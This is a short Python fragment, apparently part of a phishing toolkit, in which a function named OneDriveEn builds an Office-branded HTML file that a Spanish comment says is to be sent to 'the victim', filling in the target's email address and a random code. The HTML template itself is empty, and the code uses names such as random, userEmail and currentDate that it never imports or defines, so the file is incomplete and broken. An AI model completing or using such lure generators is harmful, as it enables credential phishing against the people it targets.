import time
import os
import sys
from helper.helper import getPath,get_input_en

def OneDriveEn():
    
    get_input_en()
    
    randomCode=random.randint(100000,999999)
    
    ##HTML que se enviara a la victima
    officeHtml=("""
                   
                   """.format(currentDate,userEmail,userEmail,userEmail,randomCode,userEmail,userEmail))
    fileNameHtml=userName+"Office.html"
    htmlFile=open("./reportFolder/"+fileNameHtml,"w")
    htmlFile.write(officeHtml)
    htmlFile.close()
    print("HTML creado y preparado para enviar")
    getPath()